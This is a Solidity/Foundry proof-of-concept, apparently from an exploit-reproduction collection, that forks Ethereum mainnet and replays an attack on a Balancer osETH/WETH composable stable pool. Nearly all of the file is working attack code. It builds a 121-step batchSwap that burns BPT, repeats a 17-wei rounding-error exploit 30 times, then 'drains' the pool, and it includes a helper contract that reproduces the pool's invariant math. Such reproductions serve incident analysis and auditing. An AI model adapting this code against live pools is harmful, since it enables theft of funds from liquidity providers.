// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import "forge-std/Test.sol";
import "../../interface/interface.sol";

interface IComposableStablePool is IERC20 {
    function getPoolId() external view returns (bytes32);
    function getBptIndex() external view returns (uint256);
    function getScalingFactors() external view returns (uint256[] memory);
    function getRateProviders() external view returns (IRateProvider[] memory);
    function updateTokenRateCache(IERC20 token) external;
    function getAmplificationParameter()
        external
        view
        returns (uint256 value, bool isUpdating, uint256 precision);
    function getSwapFeePercentage() external view returns (uint256);
    function getRate() external view returns (uint256);
    function getActualSupply() external view returns (uint256);
}

interface IRateProvider {
    function getRate() external view returns (uint256);
}

contract BalancerPoC is Test {
    BalancerExploit exploitContract;

    constructor() {
        // Fork Mainnet chain at block just before the exploit
        vm.createSelectFork("mainnet", 23717397 - 1);
        vm.warp(1762156007);
    }

    function testExploit() public {
        exploitContract = new BalancerExploit();
    }
}

contract BalancerExploit is Test {
    Calculator calculator;
    IBalancerVault public balancerVault;
    IComposableStablePool composableStablePool;
    bytes32 poolId;
    uint256 bptIndex;
    IERC20[] poolTokens;
    IERC20 weth;
    IERC20 osETH;
    uint256 notFailSuccessCount = 0;
    uint256 denominator = 10000;

    uint256 phase1TargetBalance = 67000;
    uint256 smallValue = 17;

    constructor() payable {
        calculator = new Calculator();

        balancerVault = IBalancerVault(
            0xBA12222222228d8Ba445958a75a0704d566BF2C8
        );
        composableStablePool = IComposableStablePool(
            0xDACf5Fa19b1f720111609043ac67A9818262850c
        );

        poolId = bytes32(composableStablePool.getPoolId());
        bptIndex = composableStablePool.getBptIndex();
        (poolTokens, , ) = balancerVault.getPoolTokens(bytes32(poolId));
        weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        osETH = IERC20(poolTokens[2]);

        weth.approve(address(balancerVault), type(uint256).max);
        composableStablePool.approve(address(balancerVault), type(uint256).max);
        osETH.approve(address(balancerVault), type(uint256).max);

        uint256[] memory scalingFactors = composableStablePool
            .getScalingFactors();
        console.log(
            "Initial scaling factors:",
            scalingFactors[0],
            scalingFactors[1],
            scalingFactors[2]
        );

        composableStablePool.updateTokenRateCache(osETH);

        (uint256 amp, , ) = composableStablePool.getAmplificationParameter();
        console.log("Initial amplification parameter:", amp);
        uint256 swapFee = composableStablePool.getSwapFeePercentage();
        console.log("Initial swap fee percentage:", swapFee);
        uint256 actualSupply = composableStablePool.getActualSupply();
        console.log("Initial actual supply:", actualSupply);

        scalingFactors = composableStablePool.getScalingFactors();
        console.log(
            "Updated scaling factors:",
            scalingFactors[0],
            scalingFactors[1],
            scalingFactors[2]
        );

        (uint256 osETHBalance, , , ) = balancerVault.getPoolTokenInfo(
            poolId,
            osETH
        );

        (uint256 bptTokenBalance, , , ) = balancerVault.getPoolTokenInfo(
            poolId,
            composableStablePool
        );

        (uint256 wethBalance, , , ) = balancerVault.getPoolTokenInfo(
            poolId,
            weth
        );
        console.log(
            "Initial pool balances:",
            wethBalance,
            bptTokenBalance,
            osETHBalance
        );

        IBalancerVault.FundManagement memory fundManagement = IBalancerVault
            .FundManagement({
                sender: address(this),
                fromInternalBalance: true,
                recipient: payable(address(this)),
                toInternalBalance: true
            });

        // Total: 121 swaps (Phase1: 22, Phase2: 90, Phase3: 7, Cleanup: 2)
        IBalancerVault.BatchSwapStep[]
            memory batchSwapData = new IBalancerVault.BatchSwapStep[](121);
        uint256 swapIndex = 0;

        // ========== PHASE 1: BPT Burn (รท100 progression) ==========
        uint256[11] memory phase1Amounts0 = [
            uint256(4873132999218408001625),
            48731329992184080017,
            487313299921840800,
            4873132999218408,
            48731329992184,
            487313299922,
            4873132999,
            48731330,
            487313,
            4873,
            50
        ];
        uint256[11] memory phase1Amounts2 = [
            uint256(6783065423678905706961),
            67830654236789057069,
            678306542367890571,
            6783065423678906,
            67830654236789,
            678306542367,
            6783065424,
            67830654,
            678307,
            6783,
            69
        ];

        for (uint256 i = 0; i < 11; i++) {
            // BPT -> osETH
            batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: 1, // BPT
                assetOutIndex: 0, // osETH
                amount: phase1Amounts0[i],
                userData: ""
            });

            // BPT -> WETH
            batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: 1, // BPT
                assetOutIndex: 2, // WETH
                amount: phase1Amounts2[i],
                userData: ""
            });
        }

        // ========== PHASE 2: Rounding Exploit (30 iterations ร— 3 swaps) ==========
        {
            uint256[] memory scalingFactorsForCalc = new uint256[](2);
            scalingFactorsForCalc[0] = scalingFactors[0]; // osETH
            scalingFactorsForCalc[1] = scalingFactors[2]; // WETH

            uint256[] memory currentBalances = new uint256[](2);
            currentBalances[0] = phase1TargetBalance;
            currentBalances[1] = phase1TargetBalance;

            // 30 iterations: Prime → Exploit (17 wei) → Reset
            for (uint256 i = 0; i < 30; i++) {
                // Prime: osETH -> WETH
                console.log("");
                console.log("Step: ", i);
                uint256 primeAmount = currentBalances[1] - smallValue - 1;

                batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
                    poolId: poolId,
                    assetInIndex: 0,
                    assetOutIndex: 2,
                    amount: primeAmount,
                    userData: ""
                });

                uint256[] memory tempBalances = calculator.calculateSwap(
                    currentBalances,
                    scalingFactorsForCalc,
                    0,
                    1,
                    primeAmount,
                    amp,
                    swapFee
                );
                currentBalances[0] = tempBalances[0];
                currentBalances[1] = tempBalances[1];

                console.log(
                    "currentBalances before prime:",
                    currentBalances[0],
                    currentBalances[1]
                );

                // Exploit: osETH -> WETH (17 wei)
                batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
                    poolId: poolId,
                    assetInIndex: 0,
                    assetOutIndex: 2,
                    amount: smallValue,
                    userData: ""
                });

                tempBalances = calculator.calculateSwap(
                    currentBalances,
                    scalingFactorsForCalc,
                    0,
                    1,
                    smallValue,
                    amp,
                    swapFee
                );
                currentBalances[0] = tempBalances[0];
                currentBalances[1] = tempBalances[1];
                console.log(
                    "currentBalances after exploit:",
                    currentBalances[0],
                    currentBalances[1]
                );

                uint256 loopCount = 0;

                // Reset: WETH -> osETH (retry with -10% reduction)
                if (notFailSuccessCount == 2) {
                    denominator /= 10;
                    console.log("Denominator reduced to:", denominator);
                    notFailSuccessCount = 0;
                }
                uint256 resetAmount = currentBalances[0] -
                    (currentBalances[0] % denominator);
                bool resetSuccess = false;
                bytes memory resetResult;
                while (!resetSuccess) {
                    // Use low-level call for reset swap
                    bytes memory resetCalldata = abi.encodeWithSelector(
                        calculator.calculateSwap.selector,
                        currentBalances,
                        scalingFactorsForCalc,
                        1,
                        0,
                        resetAmount,
                        amp,
                        swapFee
                    );
                    (resetSuccess, resetResult) = address(calculator).call(
                        resetCalldata
                    );

                    if (!resetSuccess) {
                        resetAmount = (resetAmount * 9) / 10;
                        console.log("Reset failed, reducing to:", resetAmount);
                        loopCount++;
                    }
                }
                if (loopCount == 0) {
                    notFailSuccessCount++;
                }
                loopCount = 0;

                tempBalances = abi.decode(resetResult, (uint256[]));

                batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
                    poolId: poolId,
                    assetInIndex: 2,
                    assetOutIndex: 0,
                    amount: resetAmount,
                    userData: ""
                });
                currentBalances[0] = tempBalances[0];
                currentBalances[1] = tempBalances[1];
                console.log(
                    "currentBalances after reset:",
                    currentBalances[0],
                    currentBalances[1]
                );
            }
        }

        // ========== PHASE 3: Profit Extraction (ร—1000 progression) ==========
        uint256 phase3Amounts = 10000;

        for (uint256 i = 0; i < 7; i++) {
            batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: i % 2 == 0 ? 0 : 2, // osETH or WETH
                assetOutIndex: 1, // BPT
                amount: phase3Amounts,
                userData: ""
            });
            phase3Amounts *= 1000;
        }

        uint256 finalSwapAmount = calculator.divUp(1838483978630598473879, 2);

        // Cleanup: drain remaining pool balance
        batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
            poolId: poolId,
            assetInIndex: 2,
            assetOutIndex: 1,
            amount: finalSwapAmount,
            userData: ""
        });

        batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
            poolId: poolId,
            assetInIndex: 0,
            assetOutIndex: 1,
            amount: finalSwapAmount,
            userData: ""
        });

        address[] memory poolTokensAddr = new address[](poolTokens.length);
        for (uint256 i = 0; i < poolTokens.length; i++) {
            poolTokensAddr[i] = address(poolTokens[i]);
        }

        int256[] memory limits = new int256[](poolTokens.length);
        for (uint256 i = 0; i < poolTokens.length; i++) {
            limits[i] = type(int256).max;
        }

        balancerVault.batchSwap(
            IBalancerVault.SwapKind.GIVEN_OUT,
            batchSwapData,
            poolTokensAddr,
            fundManagement,
            limits,
            block.timestamp + 300
        );

        uint256 drainFundAmount = composableStablePool.balanceOf(address(this));
        console.log("Drained Fund Amount (BPT):", drainFundAmount);
    }
}

contract Calculator is Test {
    uint256 private constant ONE = 1e18;
    uint256 private constant AMP_PRECISION = 1e3;

    // Calculate swap result (GIVEN_OUT mode)
    function calculateSwap(
        uint256[] memory balances,
        uint256[] memory scalingFactors,
        uint256 tokenIndexIn,
        uint256 tokenIndexOut,
        uint256 amountOut,
        uint256 amplificationParameter,
        uint256 swapFeePercentage
    ) external pure returns (uint256[] memory) {
        require(tokenIndexIn != tokenIndexOut, "Same token");

        // Upscale balances
        uint256[] memory scaledBalances = new uint256[](2);
        scaledBalances[0] = _upscale(balances[0], scalingFactors[0]);
        scaledBalances[1] = _upscale(balances[1], scalingFactors[1]);
        console.log("upscaled balances 0", scaledBalances[0]);
        console.log("upscaled balances 1", scaledBalances[1]);

        // Upscale amountOut
        uint256 scaledAmountOut = _upscale(
            amountOut,
            scalingFactors[tokenIndexOut]
        );
        console.log("Scaled Amount Out:", scaledAmountOut);

        // Calculate invariant
        uint256 invariant = _calculateInvariant(
            amplificationParameter,
            scaledBalances
        );
        console.log("invariant: ", invariant);

        // Calculate amountIn (before fee)
        uint256 scaledAmountIn = _calcInGivenOut(
            amplificationParameter,
            scaledBalances,
            tokenIndexIn,
            tokenIndexOut,
            scaledAmountOut,
            invariant
        );
        console.log("Scaled Amount In before fee:", scaledAmountIn);

        // Downscale amountIn
        scaledAmountIn = _downScaleUp(
            scaledAmountIn,
            scalingFactors[tokenIndexIn]
        );
        console.log("Scaled Amount In after downscale:", scaledAmountIn);

        // Apply swap fee
        scaledAmountIn = _downScaleUp(scaledAmountIn, ONE - swapFeePercentage);
        console.log("Scaled Amount In after fee:", scaledAmountIn);

        uint256[] memory finalBalances = new uint256[](2);
        finalBalances[tokenIndexIn] = balances[tokenIndexIn] + scaledAmountIn;
        finalBalances[tokenIndexOut] = balances[tokenIndexOut] - amountOut;
        console.log("Final Balances:", finalBalances[0], finalBalances[1]);

        return finalBalances;
    }

    function _upscale(
        uint256 amount,
        uint256 scalingFactor
    ) internal pure returns (uint256) {
        return (amount * scalingFactor) / ONE;
    }

    function divUp(uint256 a, uint256 b) public pure returns (uint256) {
        require(b != 0, "Division by zero");
        if (a == 0) {
            return 0;
        }
        return 1 + ((a - 1) / b);
    }

    function _divUp(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "Division by zero");
        if (a == 0) {
            return 0;
        }
        return 1 + ((a - 1) / b);
    }

    function _downscaleDown(
        uint256 amount,
        uint256 scalingFactor
    ) internal pure returns (uint256) {
        return (amount * ONE) / scalingFactor;
    }

    function _calculateInvariant(
        uint256 amp,
        uint256[] memory balances
    ) internal pure returns (uint256) {
        uint256 sum = balances[0] + balances[1];
        if (sum == 0) return 0;

        uint256 prevInvariant;
        uint256 invariant = sum;
        uint256 numTokens = 2;
        uint256 ampTimesTotal = amp * numTokens;

        for (uint256 iter = 0; iter < 255; iter++) {
            uint256 D_P = invariant;
            D_P = (D_P * invariant) / (balances[0] * numTokens);
            D_P = (D_P * invariant) / (balances[1] * numTokens);

            prevInvariant = invariant;

            uint256 numerator = (((ampTimesTotal * sum) / AMP_PRECISION) +
                (D_P * numTokens)) * invariant;

            uint256 denominator = (((ampTimesTotal - AMP_PRECISION) *
                invariant) / AMP_PRECISION) + ((numTokens + 1) * D_P);

            invariant = numerator / denominator;

            if (invariant > prevInvariant) {
                if (invariant - prevInvariant <= 1) {
                    return invariant;
                }
            } else {
                if (prevInvariant - invariant <= 1) {
                    return invariant;
                }
            }
        }

        revert("STABLE_INVARIANT_DIDNT_CONVERGE");
    }

    function _calcInGivenOut(
        uint256 amp,
        uint256[] memory balances,
        uint256 tokenIndexIn,
        uint256 tokenIndexOut,
        uint256 amountOut,
        uint256 invariant
    ) internal pure returns (uint256) {
        balances[tokenIndexOut] = balances[tokenIndexOut] - amountOut;

        uint256 finalBalanceIn = _getTokenBalanceGivenInvariantAndAllOtherBalances(
                amp,
                balances,
                invariant,
                tokenIndexIn
            );

        balances[tokenIndexOut] = balances[tokenIndexOut] + amountOut;

        return (finalBalanceIn - balances[tokenIndexIn]) + 1;
    }

    function _getTokenBalanceGivenInvariantAndAllOtherBalances(
        uint256 amp,
        uint256[] memory balances,
        uint256 invariant,
        uint256 tokenIndex
    ) internal pure returns (uint256) {
        uint256 ampTimesTotal = amp * balances.length;
        uint256 sum = balances[0];
        uint256 P_D = balances[0] * balances.length;

        for (uint256 j = 1; j < balances.length; j++) {
            P_D = _divDown(P_D * balances[j] * balances.length, invariant);
            sum = sum + balances[j];
        }
        sum = sum - balances[tokenIndex];

        uint256 inv2 = invariant * invariant;
        uint256 c = _divUp(inv2, ampTimesTotal * P_D) *
            AMP_PRECISION *
            balances[tokenIndex];
        uint256 b = sum + (_divDown(invariant, ampTimesTotal) * AMP_PRECISION);

        uint256 prevTokenBalance = 0;
        uint256 tokenBalance = _divUp(inv2 + c, invariant + b);

        for (uint256 i = 0; i < 255; i++) {
            prevTokenBalance = tokenBalance;

            tokenBalance = _divUp(
                (tokenBalance * tokenBalance) + c,
                (tokenBalance * 2) + b - invariant
            );

            if (tokenBalance > prevTokenBalance) {
                if (tokenBalance - prevTokenBalance <= 1) {
                    return tokenBalance;
                }
            } else if (prevTokenBalance - tokenBalance <= 1) {
                return tokenBalance;
            }
        }

        revert("STABLE_GET_BALANCE_DIDNT_CONVERGE");
    }

    function _divDown(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function _downScaleUp(
        uint256 a,
        uint256 b
    ) internal pure returns (uint256 result) {
        uint256 aInflated = a * ONE;
        assembly {
            result := mul(
                iszero(iszero(aInflated)),
                add(div(sub(aInflated, 1), b), 1)
            )
        }
    }
}
